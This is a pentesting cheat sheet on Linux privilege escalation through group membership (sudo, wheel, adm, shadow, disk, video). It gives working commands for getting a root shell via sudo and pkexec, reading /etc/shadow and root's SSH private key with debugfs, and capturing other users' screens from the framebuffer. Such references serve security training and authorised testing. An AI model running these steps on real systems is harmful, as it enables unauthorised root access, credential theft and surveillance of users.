# PrivEsc via Groups

When accessing with user X, sometimes, when executing the id command, we can be in groups where, if certain conditions are met, we can escalate privileges.

## sudo

{% hint style="info" %}
For method 2, a password is required. For method 1 it is not necessary but it may vary in some cases.
{% endhint %}

{% tabs %}
{% tab title="PE - Method 1" %}
Sometimes, by default (or because some software needs it) inside the `/etc/sudoers` file you can find some of these lines:

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL # echo "<USERNAME> ALL=(ALL:ALL) ALL" >> /etc/sudoers

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

This means that **any user belonging to the sudo or admin group can run anything as sudo**.

We can also verify it by executing the command: `sudo -l`

If this is the case, to **become root just run**:

```bash
sudo su
```
{% endtab %}

{% tab title="PE - Method 2" %}
Finds all suid binaries and checks if the `pkexec` binary exists:

```bash
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null | grep -i pkexec
```

If you find that `pkexec` **is a SUID** binary and you belong to **sudo** or **admin group**, you can probably run the binaries as sudo using `pkexec`. This is because those are typically the groups within the **polkit** policy. This policy basically identifies which groups can use `pkexec`. Check it with:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

There you will find which groups can run **pkexec** and **default** on some linux disks to **sudo** and **admin** groups.

```bash
AdminIdentities=unix-group:sudo;unix-group:admin # Default in Ubuntu
```

To **be root you can run**:

```bash
pkexec "/bin/sh" # You will be prompted for your user password.
```

If you try to run **pkexec** and get this **error**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

**It's not because you don't have permissions but because you are not logged in without a GUI**. And there is a solution for this problem [here](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:

```bash
echo $$ # Step1: Get current PID
pkexec "/bin/bash" # Step 3, execute pkexec
# Step 5, if correctly authenticate, you will have a root session
```

```bash
pkttyagent --process <PID of session1> # Step 2, attach pkttyagent to session1
# Step 4, you will be asked in this session to authenticate to pkexec
```
{% endtab %}
{% endtabs %}

## adm

When we are in the adm group, we can see the log files (.logs) in the `/var/log` directory. There we can find:

* Credentials: sometimes, we users make the mistake of logging in to some service with the password as the user, because we thought we had copied the username. This is saved in the logs.
* New logs: There can be customized logs, where we could find interesting things.
* Users: Of this, there is no need to explain.
* Routes: Possible routes in a web server.
* Domains.
* Hosts/IPs.

{% hint style="info" %}
Tip: Have a hawk eye and enumerate.
{% endhint %}

## wheel

Sometimes, by default inside the /etc/sudoers file you can find this line:

```bash
%wheel	ALL=(ALL:ALL) ALL
```

This means that any user belonging to the wheel group can run anything like sudo. If this is the case, to become root just run:

```bash
sudo su
```

## shadow

Users in the **shadow group** can **read** the **/etc/shadow** file:

```bash
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Then, read the file and try to **crack some hashes**.

## disk

This privilege is almost **equivalent to root access** since you can access all the data inside the machine.

Files: `/dev/sd[a-z][1-9]`

```bash
df -h # Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:

```bash
debugfs -w /dev/sda1
debugfs: dump /tmp/asd1.txt /tmp/asd2.txt
```

However, if you try to **write files owned by root** (such as `/etc/shadow` or `/etc/passwd`) you will get a "**Permission denied**" error.

## video

Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.

The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

To **open** the **raw image** you can use **GIMP**, select the \*\*`screen.raw` \*\* file and select as file type **Raw image data**:

![](../../../.gitbook/assets/video\_gimp1.png)

Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):

![](../../../.gitbook/assets/video\_gimp2.png)
